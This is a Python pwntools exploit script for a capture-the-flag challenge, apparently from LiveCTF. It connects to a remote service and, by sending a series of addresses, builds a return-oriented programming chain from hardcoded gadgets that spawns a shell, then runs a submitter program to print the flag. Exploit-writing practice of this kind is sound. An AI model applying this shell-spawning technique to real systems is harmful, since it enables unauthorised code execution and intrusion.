from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

binary = './challenge'


context(log_level = 'debug')

gdbscript = '''
b *0x0401A24
b *0x401A55
#continue
'''.format(**locals())


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))


def iw(addr):
    io.recvuntil(b'Addr pls: ')  # 接收提示
    io.sendline(hex(addr)[2:])  # 发送地址（转为字符串）


for i in range(4):
    iw(0x400000001)

#0x4A002C
bd = 0x401914
rdi = 0x0000000000402218 # pop rdi ; pop rbp ; ret
rsi = 0x0000000000402216 # pop rsi ; pop r15 ; pop rbp ; ret
syscall = 0x0000000000401311 # syscall
inc =  0x0000000000426894 # inc edi ; add rax, rdi ; vzeroupper ; ret
esi = 0x0000000000436488 # xchg esi, eax ; ret
c1 = 0x0000000000462069 # sub edx, esi ; imul eax, edx ; ret
mov_rdi=0x0000000000426820 #mov qword ptr [rdi], rsi; mov qword ptr [rdi + rdx - 8], rsi; ret;
mov = 0x0000000000463638 # mov dword ptr [rdx], ecx ; pop rbx ; pop r12 ; pop rbp ; ret

iw(0x469483)
iw(0x1)
iw(0x1)
iw(0x1)
iw(0x1)
iw(rsi)
iw(0x88008)
iw(0x1)
iw(0x1)
iw(rdi)
iw(0x446000)
iw(0x1)
iw(0x493933)

iw(rsi)
iw(0x6873)
iw(0x6873)
iw(0x6873)
iw(mov_rdi)
iw(0x00401917)
#iw()

#gdb.attach(io,gdbscript)
iw(0)

sl('')
io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

#  itr()
